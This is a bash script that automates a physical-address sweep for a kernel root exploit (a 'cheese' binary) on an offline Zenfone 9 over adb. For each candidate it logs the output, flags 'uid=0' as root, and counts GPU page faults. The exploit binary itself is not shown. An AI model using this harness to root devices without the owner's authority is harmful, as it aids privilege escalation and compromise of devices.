#!/usr/bin/env bash
# sweep-phyaddr.sh — systematic CHEESE_PHYADDR sweep on the offline, backed-up Zenfone 9
# Serial-pinned. Each candidate: fresh run, kernel-log fault telemetry captured.
# Safety: device is airplane/offline, spare, media-backup verified. cheese restores kernel text on exit.
set -u
S=${ZF9_SERIAL:?set ZF9_SERIAL to your device serial}
FB=$HOME/Dev/zenfone9-root/artifacts/sdk/platform-tools/fastboot   # unused here; adb only
LOGDIR=$HOME/Dev/zenfone9-root/logs/sweep-$(date +%Y%m%d-%H%M%S)
mkdir -p "$LOGDIR"
SWEEP_LIST=${1:-$LOGDIR/candidates.txt}

# baseline marker so we only read fresh kernel entries
base_ts=$(adb -s "$S" logcat -d -b kernel -t 1 2>/dev/null | head -1 | awk '{print $2}')
i=0
while read -r cand; do
  [ -z "$cand" ] && continue
  i=$((i+1))
  out=$(adb -s "$S" shell "CHEESE_NO_RETRY=1 CHEESE_ATTEMPT=999 CHEESE_PHYADDR=$cand timeout 60 /data/local/tmp/cheese id" 2>&1)
  echo "$out" > "$LOGDIR/cand-$cand.log"
  verdict="MISS"
  echo "$out" | grep -q "uid=0" && verdict="*** ROOT ***"
  echo "$out" | grep -q "found it" && verdict="TARGET-FOUND"
  fault=$(adb -s "$S" logcat -d -b kernel 2>/dev/null | grep -c "GPU PAGE FAULT" || true)
  echo "[$i] $cand -> $verdict (cumulative GPU faults: $fault)"
  # phone health check; abort if it died
  adb -s "$S" get-state >/dev/null 2>&1 || { echo "PHONE UNREACHABLE at $cand — stopping"; break; }
  adb -s "$S" shell 'true' >/dev/null 2>&1 || { echo "ADB HUNG at $cand — stopping (device likely wedged; will reboot)"; break; }
  # re-arm spray conditions: clear previous process's 1GB spray by giving kernel a beat
  sleep 2
done < "$SWEEP_LIST"
echo "sweep complete: $i candidates tried; logs in $LOGDIR"
